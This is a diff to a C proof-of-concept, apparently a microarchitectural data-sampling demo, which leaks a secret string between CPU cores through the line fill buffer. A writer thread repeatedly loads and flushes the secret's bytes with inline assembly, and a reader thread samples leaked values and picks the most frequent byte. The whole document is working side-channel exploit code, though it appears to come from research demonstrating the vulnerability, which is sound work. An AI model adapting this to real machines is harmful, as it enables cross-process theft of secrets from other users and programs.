@@ -9,51 +9,50 @@
 #include <signal.h>
 #include <sys/mman.h>
 
+#define TIMES_TEN(X) X X X X X X X X X X
 
 #define REPS 200000
 #define WRITE_VALUE 42ull
-#define CYCLE_LENGTH 40000000
+#define CYCLE_LENGTH 400000000
 
 int _page_size = 0x1000;
 
 int writer_cpu = 3, reader_cpu = 7, pid = 0;
 int hits[256];
 
-inline uint64_t time_convert(struct timespec *spec) { return (1000000000 * (uint64_t) spec->tv_sec) + spec->tv_nsec; }
+inline uint64_t time_convert(struct timespec *spec) { return (1000000000ull * (uint64_t) spec->tv_sec) + spec->tv_nsec; }
 
-inline void lfb_fill(uint8_t value, void *destination) {
-    asm volatile(
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq $0, (%1)\n"
-    "mfence\n"
-    "clflush (%1)\n"
-    ::"r"((uint64_t) value), "r"(destination));
+inline void lfb_fill(uint64_t *address) {
+    uint64_t local;
+    TIMES_TEN( asm volatile(
+            "movq (%0), %1\n"
+            "mfence\n"
+            "xor %1, %1\n"
+            "clflush (%0)\n"
+    ::"r"(address), "r"(local));)
 }
 
 inline void *test_write(char *secret, int cycle_length) {
     set_processor_affinity(writer_cpu);
-    uint64_t *destination = aligned_alloc(_page_size, _page_size);
 
     int length = strlen(secret);
     struct timespec spec;
+    clock_gettime(CLOCK_REALTIME, &spec);
     uint64_t t;
     usleep(cycle_length / 1000);
+    uint64_t *destination = aligned_alloc(_page_size, _page_size);
 
     for (int i = 0; i < length; i++) {
         t = time_convert(&spec);
+        destination[0] = (uint64_t)secret[i];
         while (time_convert(&spec) - t < cycle_length) {
-            int j = 100;
-            while (j--) lfb_fill(secret[i], destination);
+            int j = 1000;
+            while (j--) lfb_fill(destination);
             clock_gettime(CLOCK_REALTIME, &spec);
         }
     }
-
-    while (1) { lfb_fill(7, destination); }
+    destination[0] = 7;
+    while (1) { lfb_fill(destination); }
 }
 
 void test_read(void *mem, int cycle_length) {
@@ -67,14 +66,14 @@ void test_read(void *mem, int cycle_length) {
     while (1) {
         memset(hits, 0, sizeof(hits[0]) * 256);
         while (time_convert(&spec) - t < cycle_length) {
-            int reps = 100;
+            int reps = 1000;
             while (reps--) {
                 int value = lfb_read(mem);
                 if (value > 0) hits[value & 0xFF]++;
             }
             clock_gettime(CLOCK_REALTIME, &spec);
         }
-        int max = -1, max_i = -1;
+        int max = -1, max_i = 0;
         for (int i = 1; i < 256; i++) {
             if (hits[i] > max) {
                 max_i = i;
@@ -92,7 +91,7 @@ void test_read(void *mem, int cycle_length) {
 
 
 int main() {
-    printf("Demo 2a: Observing a string (store)\n");
+    printf("Demo 2b: Observing a string (load)\n");
     _page_size = getpagesize();
     time_t tm;
     time(&tm);
